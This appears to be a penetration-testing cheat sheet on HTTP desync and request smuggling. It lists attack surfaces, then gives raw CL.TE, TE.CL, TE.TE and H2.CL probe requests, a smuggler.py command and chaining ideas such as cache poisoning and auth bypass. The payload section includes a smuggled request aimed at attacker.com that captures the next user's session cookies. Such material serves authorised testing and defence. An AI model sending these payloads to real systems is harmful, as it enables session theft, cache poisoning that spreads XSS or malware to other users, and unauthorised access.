# HTTP Desync / Request Smuggling Techniques

> HTTP desync — exploiting ambiguity in request boundary parsing between proxy and origin to split or smuggle requests, poisoning connection state.

## Surface

- Front-end/back-end stacks where both parse `Content-Length` and `Transfer-Encoding`
- CDN-to-origin paths (Cloudflare → Nginx, ALB → gunicorn, Varnish → Apache)
- HTTP/2-to-HTTP/1.1 downgrade paths (H2.CL, H2.TE variants)
- Servers that accept requests with both CL and TE headers without rejecting one
- WebSocket upgrade flows — HTTP/1.1 handshake before protocol switch

## Test Approach

1. **CL.TE timing probe** — front-end uses CL, back-end uses TE; extra byte hangs:
   ```
   POST / HTTP/1.1
   Host: target.com
   Content-Length: 6
   Transfer-Encoding: chunked

   3
   abc
   X
   ```
   Observe 10s+ delay = CL.TE desync confirmed.

2. **TE.CL confirmation** — front-end uses TE, back-end uses CL:
   ```
   POST / HTTP/1.1
   Host: target.com
   Content-Length: 3
   Transfer-Encoding: chunked

   8
   INJECTED
   0

   ```

3. **TE.TE obfuscation** — get one end to ignore TE via malformed header:
   ```
   Transfer-Encoding: chunked
   Transfer-Encoding: identity
   ```
   or: `Transfer-Encoding: xchunked`, `Transfer-Encoding[space]: chunked`

4. **H2.CL** — HTTP/2 request with explicit `content-length` forcing back-end to over-read:
   - Use Burp HTTP/2 raw editor; inject `content-length: 0` alongside a body

5. **Response queue poisoning** — inject a full crafted response at the end of a smuggled request to serve it to the next user

6. **Cache poisoning via desync** — smuggle a request that poisons CDN cache key, serving attacker content to everyone

## Tools

- **HTTP Request Smuggler** (Burp) — covers CL.TE, TE.CL, TE.TE, H2.CL, H2.TE automatically
- **smuggler.py** — `python3 smuggler.py -u https://target.com -l 3` (3 iterations)
- **turbo-intruder** — timing-based parallel confirmation, useful for response queue attacks
- **HTTP Anomaly Rank** (Burp research) — ranks anomalous responses during bulk fuzzing to surface desync candidates

## Payloads / Probes

```http
# CL.TE — timing detection
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X

# TE.CL — differential response
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

1
Z
0


# TE.TE — obfuscate second TE header
Transfer-Encoding: chunked
Transfer-Encoding: x

# Smuggled request prefix (capture victim cookies)
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: attacker.com
Content-Length: 1000

key=
```

## Chain Opportunities

- **Desync → cache poisoning** — smuggled response poisons CDN, serves XSS/malware to all users
- **Desync → request capture** — absorb next user's full request including session cookies
- **Desync → auth bypass** — smuggle request with headers that skip front-end auth checks
- **H2.TE → internal service exposure** — downgrade path exposes back-end admin on HTTP/1.1

## Recent Intel

- **HTTP/1.1 must die** · Fundamental protocol ambiguity; existing mitigations (reject-both, normalize) are all bypassable via obfuscation; HTTP/2+ is the only real fix · https://portswigger.net/research/http1-must-die
- **HTTP Anomaly Rank** · Statistical outlier detection for bulk response analysis — designed to surface desync/smuggling candidates in Intruder output · https://portswigger.net/research/introducing-http-anomaly-rank
- **H2.CL / H2.TE (PortSwigger 2024)** · HTTP/2 desync variants affect major CDN/load balancer combinations; Cloudflare, Akamai, and Fastly all had H2.CL-class issues in their downgrade paths
